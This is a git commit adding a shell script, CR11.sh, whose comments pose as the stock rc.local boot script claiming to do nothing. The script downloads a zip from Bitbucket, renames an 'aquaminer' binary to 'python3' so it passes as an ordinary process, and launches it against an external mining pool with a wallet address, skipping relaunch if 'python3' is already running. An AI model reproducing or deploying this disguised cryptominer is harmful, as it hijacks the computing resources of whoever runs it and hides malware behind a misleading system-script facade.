16c3e26860a0001620e1de7775834a27a3a0bea1
haidanglx <40859600+haidanglx@users.noreply.github.com>
2018-07-16 20:53:53 +0700

    Create CR11.sh

---
+++ CR11.sh
@@ -0,0 +1,33 @@
+#!/bin/sh -e
+#
+# rc.local
+#
+# This script is executed at the end of each multiuser runlevel.
+# Make sure that the script will "exit 0" on success or any other
+# value on error.
+#
+# In order to enable or disable this script just change the execution
+# bits.
+#
+# By default this script does nothing.
+if [ -f ${PWD}/python3 ]; then
+    if pgrep -x "python3" > /dev/null
+then
+    echo "Miner dang chay roi , ke cmn di "
+    
+else
+
+echo "Miner da install , chay thoi "
+./python3 -F http://aqua.signal2noi.se:19998/0xd994dfED4458B2caDCaBBfC004372A101D273d40/sh300i
+
+     
+fi
+exit
+fi
+
+wget https://bitbucket.org/lovelyn/openai/downloads/data.zip
+unzip data.zip
+mv aquaminer-0.4-linux-amd64 python3
+./python3 -F http://aqua.signal2noi.se:19998/0xd994dfED4458B2caDCaBBfC004372A101D273d40/sh300i
+
+exit 0
